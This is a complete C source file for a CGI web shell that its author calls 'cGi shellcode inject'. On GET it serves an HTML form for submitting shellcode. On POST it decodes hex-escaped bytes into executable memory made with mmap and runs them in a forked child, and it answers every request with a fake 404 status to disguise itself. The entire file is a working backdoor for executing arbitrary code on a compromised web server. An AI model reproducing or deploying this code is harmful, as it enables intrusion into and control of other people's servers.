/*

[[ cGi shellcode inject by MMxM ]]

Greetz> meu cachorro.
rihu ??? pior que nao, eu gosto de você :/

*/

#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define die(x...) do { \
	fprintf(stderr, x); \
	exit(1); \
} while(0);

char lower(const char x){
	if(x >= 'A' && x <= 'Z'){
		return x+32;
	}

	else {
		return x;
	}
}

int hexdigit(const char x){
	if ( (x >= 'a' && x <= 'f') || (x >= '0' && x <= '9') ){
		return 1;
	}
	else
		return 0;
}

char dechex(const char h){
	if(h >= '0' && h <= '9')
		return h-'0';
	else
		return h-'a'+10;
}


int checkshellcode(unsigned char **ptr_shellcode){
	int len_out = 0, j = 0, i = 0, xxalloc = 0;
	char *tmp, x;

	if( (tmp = getenv("CONTENT_LENGTH")) == NULL ){
		die("CONTENT_LENGTH not set\n");
	}

	len_out = (int) strtol(tmp, NULL ,10);
	xxalloc = len_out/4;

	*ptr_shellcode = mmap(0, (size_t)xxalloc, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

	if(*ptr_shellcode == MAP_FAILED){
		die("mmap failed\n");
	}



	i = 0; j=0;
	while( (x = fgetc(stdin)) != EOF ){
		x = lower(x);
		switch(i%4){
			case 0:
				if(x != '\\') goto end;
			break;

			case 1:
				if(x != 'x') goto end;
			break;

			case 2:
				if( !hexdigit(x) ) goto end;
				(*ptr_shellcode)[j] = 0;
				(*ptr_shellcode)[j] = dechex(x)*16;
			break;

			case 3:
				if( !hexdigit(x) ) goto end;
				(*ptr_shellcode)[j++] += dechex(x);
			break;
		}

		i++;
	}

	end:

	if(i != len_out){
		munmap(*ptr_shellcode, xxalloc);
		return 0;
	}

	return 1;
}

void show_shell(void){
	printf("\
<html>\n\
 <head>\n\
  <title>cGI shellcode inject</title>\n\
 <style>\n\
.ta3 {\n\
 width:300px;\n\
 height:100px;\n\
 border:2px dashed #c00;\n\
 resize: none;\n\
 color: #c00;\n\
}\n\
\n\
body {\n\
 color: #c00;\n\
}\n\
\n\
.bt {\n\
 border-style: solid;\n\
 border-color: #c00;\n\
 background-color: #fff;\n\
}\n\
\n\
 </style>\n\
 </head>\n\
 <body>\n\
  <center>\n\
cGI shellcode inject - Coded by <a href='https://twitter.com/hc0d3r' target='_blank'>mmxm</a><br/><br/>\n\
<textarea id=\"sc\" class=\"ta3\">\\x00\\x00\\x00\\x00\\x00</textarea><br/><br/>\n\
<button type=\"button\" onclick=\"sendshellcode()\" class='bt'>Send Shellcode</button>\n\
<br/>\n\
<br/>\n\
<div id=\"status\"></div>\n\
<script>\n\
function sendshellcode(){\n\
	var shellcode = document.getElementById(\"sc\").value;\n\
	var status = document.getElementById(\"status\");\n\
	shellcode = shellcode.replace(/\\n/g, \"\");\n\
	shellcode = shellcode.replace(/ /g, \"\");\n\
\n\
	if(shellcode == \"\"){\n\
		status.innerHTML = 'Invalid !!!';\n\
		return;\n\
	}\n\
\n\
\n\
	var request = new XMLHttpRequest();\n\
\n\
	request.open(\"POST\", window.location.href, true);\n\
	request.setRequestHeader(\"Content-type\",\"text/plain\");\n\
	request.send(shellcode);\n\
\n\
	status.innerHTML = 'Sent !!!';\n\
}\n\
</script>\n\
\n\
</center>\n\
</body>\n\
</html>\n\
");

}

int main(void){
	char *request_method;
	unsigned char *shellcode;
	pid_t x;

	printf("Status: 404 Not Found\r\n");
	printf("Content-type: text/html\r\n\n");

	if( (request_method = getenv("REQUEST_METHOD")) == NULL){
		die("Unknown REQUEST_METHOD\n");
	}

	if( !strcmp(request_method,"POST") ){
		if( checkshellcode(&shellcode) ){
			printf("OK");

			x = fork();
			if(x == 0){
				(*(void(*)())shellcode)();
				exit(0);
			}
		} else {
			printf("invalid shellcode\n");
		}
	}

	else if( !strcmp(request_method, "GET") ){
		show_shell();
	}

	else {
		die("Method not allowed\n");
	}

	return 0;
}
